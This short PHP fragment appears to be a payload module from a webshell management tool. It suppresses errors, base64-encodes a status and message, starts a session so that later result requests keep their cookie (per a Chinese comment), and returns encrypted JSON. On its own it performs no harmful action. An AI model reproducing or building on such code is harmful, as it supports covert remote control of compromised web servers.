@error_reporting(0);
function main($content)
{
	$result = array();
	$result["status"] = base64_encode("success");
    $result["msg"] = base64_encode($content);
    @session_start();  //初始化session，避免connect之后直接background，后续getresult无法获取cookie

    echo encrypt(json_encode($result));
}
